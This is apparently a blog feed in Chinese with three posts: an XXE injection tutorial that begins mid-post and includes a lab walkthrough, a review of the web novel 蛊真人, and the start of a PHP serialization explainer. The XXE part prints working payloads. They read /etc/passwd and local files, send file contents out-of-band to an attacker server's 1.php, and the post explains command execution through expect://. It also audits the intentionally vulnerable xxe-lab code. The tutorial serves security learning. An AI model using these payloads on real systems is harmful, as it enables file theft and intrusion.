&#x27;http://192.168.150.1/1.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>%remote</code>引入外部XML文件到这个 XML 中，<code>%all</code>检测到send实体，在 root 节点中引入 send 实体，便可实现数据转发。<br> 利用过程：第3行，存在漏洞的服务器会读出file的内容（c:&#x2F;1.txt），通过Quan.xml带外通道发送给攻击者服务器上的1.php，1.php做的事情就是把读取的数据保存到本地的1.txt中，完成Blind XXE攻击。</p><h4 id="1-3-1-按构造外部实体声明"><a href="#1-3-1-按构造外部实体声明" class="headerlink" title="1.3.1 按构造外部实体声明"></a>1.3.1 按构造外部实体声明</h4><h5 id="1-3-1-1-直接通过DTD外部实体声明"><a href="#1-3-1-1-直接通过DTD外部实体声明" class="headerlink" title="1.3.1.1 直接通过DTD外部实体声明"></a>1.3.1.1 直接通过DTD外部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE Quan[</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br></pre></td></tr></table></figure><p>直接引用外部实体，实现对passwd文件的读取。</p><h5 id="1-3-1-2-通过DTD文档引入外部DTD文档中的外部实体声明"><a href="#1-3-1-2-通过DTD文档引入外部DTD文档中的外部实体声明" class="headerlink" title="1.3.1.2 通过DTD文档引入外部DTD文档中的外部实体声明"></a>1.3.1.2 通过DTD文档引入外部DTD文档中的外部实体声明</h5><p><strong>（注意是通过DTD文档引入外部实体）</strong></p><p>XML文件内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE Quan SYSTEM &quot;https://blog.csdn.net/syy0201/Quan.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br></pre></td></tr></table></figure><p>DTD文件内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用外部的dtd文件内容中的实体，然后达成读取文件的作用。</p><h5 id="1-3-1-3-通过DTD外部实体声明引入外部DTD文档中的外部实体声明"><a href="#1-3-1-3-通过DTD外部实体声明引入外部DTD文档中的外部实体声明" class="headerlink" title="1.3.1.3 通过DTD外部实体声明引入外部DTD文档中的外部实体声明"></a>1.3.1.3 通过DTD外部实体声明引入外部DTD文档中的外部实体声明</h5><p><strong>（重点是通过文档中的外部实体，引入外部实体，和上面的不一样）</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Quan[</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;https://blog.csdn.net/syy0201/Quan.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br></pre></td></tr></table></figure><p>Quan.dtd的外部实体声明内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure><p>最后的效果，还是把文件内容读取出去。</p><h3 id="1-4-XXE能做什么："><a href="#1-4-XXE能做什么：" class="headerlink" title="1.4 XXE能做什么："></a>1.4 XXE能做什么：</h3><p>上一节疯狂暗示了 <strong>外部实体</strong> ，那他究竟能干什么？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p><p>对于PHP语言，可以使用FILE、HTTP、FTP还有PHP伪协议，来进行文件读取。</p><p>也就是说，对于XXE中的XML文档来看，可能出现的危害主要是：</p><blockquote><p>1、读取任意文件</p><p>通过多种协议来对本地文件进行读取。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220804143420071.png" alt="image-20220804143420071"></p><p>2、执行系统命令</p><p>比较少出现的情况，在配置不当或是开发内部应用的情况下，可以通过XXE执行代码。（例如PHP expect 模块被加载到了易受攻击的系统或是处理XML的内部应用上。），使得攻击者能够通过XXE执行代码。</p><p>关于PHP expect:&#x2F;&#x2F;，这是一个处理交互流的协议，可以用来执行shell命令。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220804143512998.png" alt="image-20220804143512998"></p><p>3、探测内网端口</p><p>可以根据返回的信息判断端口是否打开，若测试端口返回“Connection refused”则可以知道该端口是closed的，否则为open。</p><p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220804150219599.png" alt="image-20220804150219599"></p><p>简单来说，就是通过引用外部实体的方式，来尝试连接成功，如果是报的拒绝连接错了，就是无法访问。</p></blockquote><h3 id="1-5-XXE-Lab靶场"><a href="#1-5-XXE-Lab靶场" class="headerlink" title="1.5 XXE-Lab靶场"></a>1.5 XXE-Lab靶场</h3><blockquote><p><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p><p>还是这位师傅写的靶场。</p></blockquote><p>我这里直接搭建的是PHP的XXE靶场，搭建没什么好说的。还是直接用phpstudy，把下载的源码里面的<code>php_xxe</code>文件放到根目录下打开就行。 </p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220805135335231.png" alt="image-20220805135335231"></p><p>为了理解整个XXE漏洞的基本运行过程，这里我直接对源代码进行审计：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>); <span class="comment">//禁用加载外部实体的功能（XXE就是XML外部实体注入漏洞），这里的布尔值是false，所以是允许加载外部实体功能。</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">//这里分成两部分看，php://input这部分是PHP的伪协议，可以读取没有处理过的Post数据，简单来说这一套函数的作用就是把POST过来的数据作为XML文件进行读取，然后存放到变量$xmlfile中。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;  <span class="comment">//启用了try&#123;&#125;catch&#123;&#125;异常处理，讲要执行的代码放在try块中,如果这些代码中有异常，则跳转到catch块中。也就是try调用代码，catch抛出异常。</span></span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>(); <span class="comment">//类，主要就是用于处理xml文档的，这里实例化了一个对象。</span></span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="comment">//调用了成员方法，成员方法作用是解析指定的XML文本串，然后再当前文档对象中构建一个棵DOM节点树，而丢弃之前存在于文档中的任何节点，简单来说把一个XML格式的字符串输入进去，然后覆盖掉原本的节点，这里是把POST过来的数据存入进去。</span></span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>); <span class="comment">//将DOM节点转换为SimpleXMLElement的节点，如果失败，返回false。其实简单来说就是把子元素的值存入了。这样就可以直接对子元素进行输出。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username; <span class="comment">//如上，这里直接存放了子元素名字叫&lt;username&gt;&lt;/username&gt;包裹的值</span></span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password; <span class="comment">//同上，具体看抓包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123; <span class="comment">//对传输过来的username和password与预设的密码和用户名进行判定，相同则进行下一步。</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>); <span class="comment">//格式化输出内容</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>); <span class="comment">//声明content-type</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面就是源代码的解析，然后看一下抓包的分析：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220805151601688.png" alt="image-20220805151601688"></p><p>这里就可以看见传输的数据是通过XML格式进行传输的，同时也可以从<code>Content-type</code>字段看到需求是<code>application/xml;charset=utf-8</code></p><p>这里我们使用XXE，同时在网页根目录下创建一个flag.php文件，来测试文件的读取。</p><p>进行改包：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Ho1L</span>0w-By[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/phpstudy_pro/WWW/flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span> <span class="comment">&lt;!--注意引用的时候要加上引号--&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220805153030885.png" alt="image-20220805153030885"></p><p>可以看见这里成功的读取了我们创建的文件，并且进行了返回。</p><p>这就是简单的有回显的XXE漏洞，这里是实现了任意文件读取。</p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《蛊真人》——小人物的坚持</title>
      <link href="/2022/06/17/guzhenren/"/>
      <url>/2022/06/17/guzhenren/</url>
      
        <content type="html"><![CDATA[<p>​在开始看这本小说的时候，我刚高二。但是我已经在网络小说的世界里经历了7年了。从小学的《斗罗大陆》，《斗破苍穹》，《冰火魔厨》……，到初中的《凡人修仙传》，《仙逆》，《无限恐怖》……</p><p>​到高中为止我已经看了很多网文，当然，也有很多的出版文学，每本书基本都能给我带来不同的感受，以及不同的思考，但是从未有一本书能够像《蛊真人》一样给我惊喜以及精神上的力量。</p><p>​《蛊真人》，作者也叫蛊真人。他用自己的奇思妙想为我们构建了一个千奇百怪的蛊的世界——“人是万物之灵，蛊是天地真精”。</p><p>​ 作者用各类蛊，将传统仙侠中讲究的所谓财侣法地合并在了一起，从而创造出了一个远远和我们认知中不同的蛊的世界。在传统的印象中，蛊是南疆巫毒的产物，是一种毒虫，用来害人的节肢类动物，有的还有一些奇妙的强身健体的效果。</p><p>​但是在蛊真人中，蛊远不止如此，它们有的长得像是昆虫，有的则像是器物，有的甚至什么都不是，就是单纯的一个概念，蛊千奇百怪。在传统仙侠中，用飞剑，那就有长得像是飞剑的飞剑蛊。在武侠中有金钟罩，那就有长成天牛的金钟罩蛊。修仙要想餐风饮露，那就有餐风蛊，饮露蛊，让你可以真的以风露为食，填饱肚子。你要治疗自己，那就有治疗蛊，你要快速移动，就有移动蛊。甚至你可以将蛊虫进行合炼，创造出新的蛊虫（例如有人用电蛊和爆脑蛊创造出了电脑蛊，用来开机甲）。除此之外，还有智慧蛊，力量蛊，希望蛊等等等等……</p><p>​作者用他的想象力为我们创建了一个丰富多彩的蛊虫的世界，里面的万事万物都离不开蛊，蛊就是财侣法地的表现化。但同时，作者也为这个世界赋予了与现实世界相似的残酷性。资源的竞争，人性的角逐，无处不在，人与人之间充满了算计，相互之间包藏祸心，因为这里是高武的世界，有人抛妻弃子，甚至杀死自己的父母，只为了获取更多的力量，为了让自己更加的强大，能够在世界中立足。从这个角度看，这充满奇幻色彩的蛊世界，却又和现实中的养蛊是那么的相似。将无数的毒虫放在一个瓮里，让他们自相残杀，而最后活下来的那一只，就是最毒，最凶猛的毒虫，也可以称为蛊。</p><p>​从这个角度来讲，主角古月方源，就是那一只最后练成的蛊。</p><p>​作者从一开始就讲过，他想写一个反派，一个真真正正的魔头，不会像是一般小说反派那般愚蠢，不会看见美女就走不动路，不会为了一点鸡毛蒜皮的矛盾就出言不逊等着主角打脸，而是永远有自己的理想，永远有自己的坚持，永远不会放弃，无论手段，无论方法，也要达成自己的目标。</p><p>​而这个魔头，就是古月方源。</p><p>​他残忍，他无情，他高大，他低贱，他辉煌，他平庸，他坏事做尽，坏事做绝。</p><p>​他可以为了一对骨肉相连蛊，毫不犹豫的害死一对双胞胎，他也可以为了提高自己的资质，让狗熊杀死一个少女。同样，他也可以为了让自己的听觉侦察范围更广，不用麻药切掉自己的一只耳朵，装上地听肉耳草蛊，用一把匕首生生的扒去自己全身人皮，以伪装成别人。他对别人狠，对自己更狠。</p><p>​《蛊真人》这本书的主要故事，就是跟着主角，古月方源开始他的永生大计。在这个世界用蛊的人被叫做蛊师，按照能力，可以分为一到九转，其中九转最强，被称为尊者，蛊尊。在这本书中，设定是蛊尊是绝对的无敌，只要出现了，九转之下，都是蝼蚁，但同时，每个大时代只能出现一位。</p><p>​方源的前世，从一介凡人不断修炼，历经千辛万苦，修炼到了六转蛊仙，他为元石发过愁，也赚过大钱，他当过乞丐，也做过商贾，他老过，他也用寿蛊恢复过年轻，他走过很远，穿过了山川与海洋。整个蛊世界，南疆，西漠，东海，北原和中州，五大域他都去过，漂泊三百年，修炼二百年，终于，成为了六转蛊仙，练就了一只奇蛊——春秋蝉。</p><p>​春秋蝉有穿越时空的能力，也因此，方源在被正道围攻，走到末路的时候，选择用自己的全身修为和性命为动力，催动春秋蝉回到过去。毫无疑问，春秋蝉是方源的金手指，虽然这个金手指有极大的副作用，成功率有限，如果失败，就是彻底自爆死亡，但仍然为方源提供了极大的助力。</p><p>​小说整体的故事，就是看穿越回五百年前的方源，是如何为了永生，开始谋划和冒险的。</p><p>​说到这里，是不是感觉这本书和别的后宫小说没什么区别？主角接下来无非就是打怪升级，靠着自己的前瞻性抢夺机缘，升级打脸，装X逆袭。但是这偏偏不是蛊真人的思路。</p><p>​你穿越回五百年前，优势很大？那就让未来因为你的蝴蝶效应而改变，让你只能获得部分的信息。你想要成仙？那就让你成仙之路断绝，变成仙僵，无法修炼，连思考能力都下降。你想要永生？那就让天意浩荡，所有人与你为敌，让你困难重重，让你命中注定不能永生。</p><p>​方源从南疆的青茅山走出来，到三王福地，八十八角真阳楼，义天山大战，再到天庭大战，他一步步走来，每一步都是刀光剑影，每一步都是荆棘险峻。你聪明，敌人和你一样聪明，你有信息差，敌人比你有更多的信息差，你有金手指，但是只能让你回到15分钟到一个小时之前，甚至还有可能失败。</p><p>​方源还剩什么？</p><p>​他到底要怎么取胜？</p><p>​其实，方源从来就没有什么作弊的金手指，或者说，他的金手指只有一个，不是春秋蝉，而是他的坚持。</p><p>​他坚持，所以他能够从青茅山走出来，成为甲等资质，他坚持，所以他不会接受命运的浮沉，他知道自己想要什么，他知道自己为了什么而坚持。</p><p>​就像是这本书的灵魂，《人祖传》里讲的一样</p><blockquote><p>人祖听了便问：“你们为什么要寻找自由蛊呢？”<br>　　鱼群们唉声叹气：“我们曾经拥有过自由蛊，但我们没有意识到。当我们失去了它，我们才发现自己没有了鱼鳃，再不能在水里呼吸。当我们重新获得自由，我们才可以在水里随意畅游。”<br>　　人祖大悟：“我明白了，人也得有自由。人如果没有了自由，就好像是鱼没有了腮，不能呼吸。”<br>　　“没错！”人祖一拍巴掌，大笑起来，“我要得到自由，摆脱宿命的束缚，我要自由自在的呼吸，永远存在下去，我要永生！”<br>　　鱼群纷纷冷笑：“人啊，你怎么能有这样的非分之想呢？”<br>　　“你瞧瞧我们，鱼鳃是鱼必须要有的，所以我们追寻自由是一种本分。”<br>　　“而你们人的一生注定和永生无缘，将会生老病死。人啊，你要追寻自由，也要恪守你的本分，可不能胡思乱想。”<br>　　人祖皱皱眉，神情厌烦：“是这样的吗？”<br>　　鱼群最后留下一句话：“人啊，让我们给你一个忠告吧。将来你若是得到了自由，千万要懂得珍惜，不要像我们一样轻易松手。千万不要放自由蛊飞走，不然你会后悔的。”<br>　　人祖和鱼群分别，渐渐的忘记了鸟群、豹群、鱼群关照他的话。<br>　　“我是人，我要追求自由！”</p></blockquote><p>也就像是方源打破宿命做的一样：</p><blockquote><p>人祖再说：他得到自由，摆脱宿命的束缚，要自由自在的呼吸，永远存在下去，他要永生不老！<br>　　鱼群否决他：你们人的一生注定和永生无缘，将会生老病死。人啊，你要追寻自由，也要恪守你的本分，可不能胡思乱想。<br>　　人祖疑惑。<br>　　人祖怏怏。<br>　　人祖厌烦。<br>　　人祖疯了！<br>　　你怎么可以这样想？<br>　　我为什么不能这样想？<br>　　一个人，为什么不能和爱人永不分离？<br>　　一个人，为什么不能衣食无忧，富贵滔天？<br>　　一个人，为什么不能永生不死不老？<br>　　就因为宿命不允许吗？<br>　　就因为它不允许，我就不能做！？我就不能想？！<br>　　凭什么？<br>　　他妈的凭什么？<br>　　凭什么不可以想！？<br>　　凭什么永生就不可行？！</p><p>​好吧。<br>　　如果这样想，让我疯。<br>　　那就让我成为疯子！<br>　　如果这样追寻，让我魔。<br>　　那就让我成为魔头！！<br>　　方源望着手中的宿命蛊，冷冷一笑。<br>　　他手轻轻一用力。<br>　　咯嘣。<br>　　一声轻响。<br>　　宿命蛊被他直接捏成碎片。<br>　　九转宿命蛊——<br>　　毁了！</p></blockquote><p>我看过四本讲勇气和坚持的书。</p><p>《老人与海》看时懵懵懂懂，后来我看到了老人面对残酷生活的乐观，他只有勇气，但是却少了坚持。</p><p>《钢铁是怎样炼成的》保尔柯察金的勇气和坚持让我怜悯，我说，我如果像他一样不幸，我应该会放弃。</p><p>《钢之炼金术士》艾尔利克兄弟的友谊和三观，以及钢铁般的勇气和坚持让我感动，我说，如果我向他们一样不幸，我也要学会爱人，学会坚持。</p><p>而《蛊真人》，方源的坚持让我感到震撼。</p><blockquote><p>​他面无表情，不管走多少步，逆流河永远流淌在他的脚下，仿佛是绝大的命运的嘲笑。<br>　　但是他仍旧走着。<br>　　他从前世五百年走来，不知要走到什么时候<br>但他知道，自己要去往何方。<br>　　似乎……没有人能阻止他。<br>　　至少……如今的逆流中，已经无人可阻。<br>　　前世五百年前。<br>　　方源倚在竹楼上，看看山寨，又仰望背后的青茅山。<br>　　双手握拳，稚嫩的小脸上，满是希冀。<br>　　“是时候放弃过去了。”<br>　　“穿越到这里来，这是我的福缘！因为在这里，可以实现长生。”<br>　　“我要把握这样难得的机会！不然，怎么对得起自己，对得起这份机缘？”<br>　　“当然，目前阶段，是提升我和弟弟的生活环境。嘿，那个小家伙……”<br>　　开窍之后。<br>　　演武场上，方源垂下头，一脸惊怒。<br>　　“被暗算了！”<br>　　“是谁暗算我？不愿意让我战胜对手？答案不言而喻！”<br>　　“哥哥，放弃吧，你不会是我的对手。因为天资不同，我们注定不同。”眼前的古月方正带着快意道。<br>　　方源转头就走，他的眼中全是坚定之色。<br>　　“既然山寨不栽培我，舅父舅母甚至都故意排挤我，我留在这里有什么意思？”<br>“难道在这里就可以变强，实现长生么？”<br>　　“不如出去？”<br>　　商队里。<br>　　大胡子蛊师死了，方源站在他的墓前。<br>　　少年满含泪水，哽咽地道：“胡子大叔，你安息吧。”<br>　　“谢谢你临走前的礼物。”<br>　　“你说：小时候，你想成为顶天立地的人物，就像是正道的那些传奇人物那样。少年时，觉得成为一族族长也不错。青年时，能够成为家老就感觉很棒了。中年后，被家族流放，发现其实能养得活自己，养得起身上的蛊虫，就能让自己满意。”<br>　　“我不会这样，让梦想随着年龄而萎缩。”<br>　　“这个世界太大，而我们都是小人物……但我会加油的！会一直努力！”<br>　　……<br>　　童年、少年、青年。<br>　　青茅山、商队，一路行走。<br>　　壮年、老年，终究获得寿蛊。<br>　　南疆、西漠、东海、中洲。<br>　　春秋蝉重生后，青茅山、三王山、狐仙福地、王庭福地、义天山、逆流河！<br>　　一步步走来，一路风雨。<br>　　碧晨天皱起眉头，他盯着方源的身影，心中<br>呢喃道：“这是何等的意志！他究竟为什么坚持？是什么能让他如此坚持？”<br>　　雪胡老祖冷哼，眼中闪过郑重之色，再无之前面对一般七转蛊仙的轻蔑：“这么说来，三十万年前有元莲，三十万后有柳贯一……逆流河主啊。”<br>　　毛里球望着方源身上越盛的光辉，无可奈何，龇牙咧嘴，爪子下意识地在地面上挠，挠出道道深痕。<br>　　白凝冰、黑楼兰俱都眼角狂跳，神情动容。<br>　　赵怜云此刻悠悠醒转，她望着方源另一个胳膊下夹着的，马鸿运的尸体，她的眼泪夺眶而出。<br>　　她在心中哭嚎：“鸿运，鸿运，你怎么可以离我而去。没有了你，我在这个世界上，就是孤家寡人。我活着还有什么意思？你知道吗？一个人的坚持是有多难！”<br>　　一个人的坚持会有多难？<br>　　在场的所有蛊仙，都能回答这个问题。<br>　　因为他们当中，有的因为责任而坚持，有的因为仇恨而坚持，有的因为精彩而坚持，有的因为爱情而坚持……<br>　　而方源的回答呢？<br>　　他仍旧面无表情，毫无所动地向前进。<br>　　我曾经呐喊过，渐渐的我不发出声音。<br>　　我曾经哭泣过，渐渐的我不再流泪。</p><p>​我曾经悲伤过，渐渐的我能承受一切。<br>　　我曾经喜悦过，渐渐的我看淡世间。<br>　　而如今！<br>　　我只剩下面无表情，我的目光如磐石般坚硬，我的心中剩下坚持。<br>　　这就是我，一个小人物，方源的——坚持！</p></blockquote><p>有人说，真正的英雄主义，是认清了生活的残酷，仍然能热爱生活。那方源应当是当之无愧的英雄。他残忍，他无情，他低贱，他卑微，他坚强，他冷静，他高大，他辉煌，他坚持，他是古月方源。</p><p>在高考前，方源的精神无数次的鼓励了我，安慰了我孤独的心。每每看见方源的坚持，就又能让我拥有力量，去面对生活中的一切苦难，同时保持自己的本心。</p><p>我曾经呐喊过，渐渐的我不发出声音。<br>我曾经哭泣过，渐渐的我不再流泪。<br>我曾经悲伤过，渐渐的我能承受一切。<br>我曾经喜悦过，渐渐的我看淡世间。</p><p>我是真人，我是古月方源。</p><p>如果满分是十分，这本书我会毫不犹豫的给他9.8分，这是超出了网络小说的一本书，是能给人以力量的精神食量，虽然需要辩证看待，但是，他给人的力量是实打实的。</p><p>坚持，方源的坚持。</p>]]></content>
      
      
      <categories>
          
          <category> 书评 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 写作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2022/06/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A/"/>
      <url>/2022/06/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化："><a href="#PHP反序列化：" class="headerlink" title="PHP反序列化："></a>PHP反序列化：</h1><p>关于反序列化的情况：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;ghtwf01&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化前输出结果：</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144212-8e85e4f4-0517-1.png" alt="img"></p><p>反序列化后输出结果：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;ghtwf01&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144234-9c15d5ca-0517-1.png" alt="https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png"></p><p>O:4:”test”这部分是对象名字的描述</p><p>:2:这部分是有两个成员属性，然后到花括号开始描述类的内部的内容。</p><p>s就是string</p><p>如果成员不是使用public进行标记，而是使用pravite，则会出现一下的情况：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;ghtwf01&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$sex</span>=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144245-a2973722-0517-1.png" alt="img"></p><p>其中，testage是作为age的替换出现的。</p><p><strong>当private标注的成员属性进行反序列化的时候，会将格式改为%00类名%00成员名的</strong>格式</p><p>其中%00会占用一个字节的长度，因此，本来只有7个字符，但是实际反序列化出来之后，会显示有9个字节。</p><p>当使用protect之后，格式变为：</p><p><strong>%00*%00成员名</strong></p><p>就像是上面的结果变为了*sex一样，本来是sex。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220309085459451.png" 